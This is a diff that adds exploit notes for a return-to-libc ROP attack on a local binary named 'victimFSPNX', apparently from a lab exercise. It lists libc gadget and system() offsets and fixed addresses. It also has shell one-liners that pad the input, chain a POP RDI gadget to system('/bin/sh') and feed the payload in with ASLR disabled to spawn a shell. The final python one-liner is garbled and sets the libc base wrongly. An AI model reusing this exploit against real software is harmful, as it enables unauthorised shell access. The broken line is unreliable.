@@ -1,0 +1,35 @@
+#/usr/lib/x86_64-linux-gnu/libc.so.6
+
+GADGET = 0x26542 # POP RDI
+SYSTEM = 0x052fd0
+
+LIBC_START = 0x7ffff7dc6000
+ESP_RET = 0x7fffffffe4c0
+
+SYSTEM_FUNCTION = LIBC_START + SYSTEM
+ROP = LIBC_START + GADGET
+
+(echo -n /bin/sh | xxd -p; printf %0130d 0;
+printf %016x $((0x7ffff7dc6000+0x26542)) | tac -rs..;
+printf %016x 0x7fffffffe4c0 | tac -rs..;
+printf %016x $((0x7ffff7dc6000+0x52fd0)) | tac -rs..) | xxd -r -p |
+ setarch `arch` -R ./victimFSPNX 
+
+(echo -n /bin/sh | xxd -p; printf %0130d 0;
+printf %016x $((0x7ffff7dc6000+0x026542)) | tac -rs..;
+printf %016x 0x07fffffffe4c0 | tac -rs..;
+printf %016x $((0x07ffff7dc6000+0x052fd0)) | tac -rs..) |
+xxd -r -p | setarch `arch` -R ./victimFSPNX
+
+
+python -c "import struct;bin='/bin/sh\0'GADGET=0x26542;SYSTEM=0x052fd0;LIBC_START=0x052fd0;ESP_RET=0x7fffffffe4c0;ROP=LIBC_START+GADGET;PAD='A'*130;print(bin+PAD+ROP+ESP_RET;SYSTEM);"
+
+
+
+
+
+
+
+
+
+
